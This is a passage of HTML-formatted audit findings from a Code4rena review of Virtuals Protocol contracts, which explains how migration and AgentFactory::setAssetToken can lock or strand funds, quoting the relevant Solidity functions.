amount.\u003c/li\u003e\n\u003cli\u003eThe protocol team deploys new versions of the Agent contracts and encourages migration.\u003c/li\u003e\n\u003cli\u003eThe founder attempts to migrate their Agent using \u003ccode\u003eAgentMigrator.migrateAgent()\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThe founder must transfer additional virtual tokens to the new token contract to create new LP (assuming around the same amount of virtual tokens are required).\u003c/li\u003e\n\u003cli\u003eNew LP tokens are staked in the new \u003ccode\u003eveToken\u003c/code\u003e, but the original LP tokens (worth \u003ccode\u003e~\u003c/code\u003e35,000 usd) remain locked in the old \u003ccode\u003eveToken\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThe founder now has capital locked in two places - the new \u003ccode\u003eveToken\u003c/code\u003e (functional) and the old \u003ccode\u003eveToken\u003c/code\u003e (obsolete).\u003c/li\u003e\n\u003cli\u003eThe founder cannot withdraw their original locked LP until after 10 years from the original deployment date.\u003c/li\u003e\n\u003c/ol\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-23-using-agentfactorysetassettoken-will-lead-to-loss-of-funds\" style=\"position:relative;\"\u003e\u003ca href=\"#m-23-using-agentfactorysetassettoken-will-lead-to-loss-of-funds\" aria-label=\"m 23 using agentfactorysetassettoken will lead to loss of funds permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-180\"\u003e[M-23] Using \u003ccode\u003eAgentFactory::setAssetToken\u003c/code\u003e will lead to loss of funds\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-729\"\u003eYouCrossTheLineAlfie\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L123\"\u003e\u003ccode\u003eAgentFactory::assetToken\u003c/code\u003e\u003c/a\u003e is initially set upon early \u003ccode\u003einitialize\u003c/code\u003e call:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"111\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// AgentFactory.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitializer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e__Pausable_init\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenImplementation\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenImplementation_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveTokenImplementation\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveTokenImplementation_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edaoImplementation\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edaoImplementation_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;                       \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Sets assetToken initially\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etbaRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etbaRegistry_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enft_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplicationThreshold\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplicationThreshold_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nextId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_grantRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDEFAULT_ADMIN_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_vault\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evault_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis \u003ccode\u003eassetToken\u003c/code\u003e is being used inside \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L196\"\u003e\u003ccode\u003eAgentFactory::executeApplication\u003c/code\u003e\u003c/a\u003e, \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L288\"\u003e\u003ccode\u003eAgentFactory::_createNewAgentToken\u003c/code\u003e\u003c/a\u003e and \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L179\"\u003e\u003ccode\u003eAgentFactory::withdraw\u003c/code\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eHowever, changing this \u003ccode\u003eassetToken\u003c/code\u003e via \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L388\"\u003e\u003ccode\u003eAgentFactory::setAssetToken\u003c/code\u003e\u003c/a\u003e has serious complications;\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"112\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetAssetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDEFAULT_ADMIN_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;          \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Sets `assetToken`\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThese issues are described below:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L179\"\u003e\u003ccode\u003eAgentFactory::withdraw\u003c/code\u003e\u003c/a\u003e function would fail as the new \u003ccode\u003eassetToken\u003c/code\u003e will be different from the funds held by the contract during \u003ccode\u003eproposeAgent\u003c/code\u003e call.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"113\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewithdraw\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enoReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eApplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_applications\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ehasRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWITHDRAW_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Not proposer\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eApplicationStatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eActive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Application is not active\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalEndBlock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Application is not matured yet\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewithdrawableAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewithdrawableAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewithdrawableAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eApplicationStatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWithdrawn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewithdrawableAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);      \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Would break due to different assetToken than upon proposal\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L196\"\u003e\u003ccode\u003eAgentFactory::executeApplication\u003c/code\u003e\u003c/a\u003e would fail as there might be no new \u003ccode\u003eassetToken\u003c/code\u003e available inside the contract:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"114\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexecuteApplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecanStake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enoReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eliquidityPools\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);          \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Would revert\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddInitialLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003eThere is no way available to recover old \u003ccode\u003eassetToken\u003c/code\u003e balance as the contract lacks a \u003ccode\u003erecoverERC20\u003c/code\u003e kind of function.\u003c/li\u003e\n\u003cli\u003eIf there were a case where \u003ccode\u003eassetToken\u003c/code\u003e were available inside the contract, the \u003ccode\u003e_createNewAgentToken\u003c/code\u003e would use unintended \u003ccode\u003eassetToken\u003c/code\u003e than what it was actually proposed to:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"115\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_createNewAgentToken\u003c/span\u003e\u003cspan 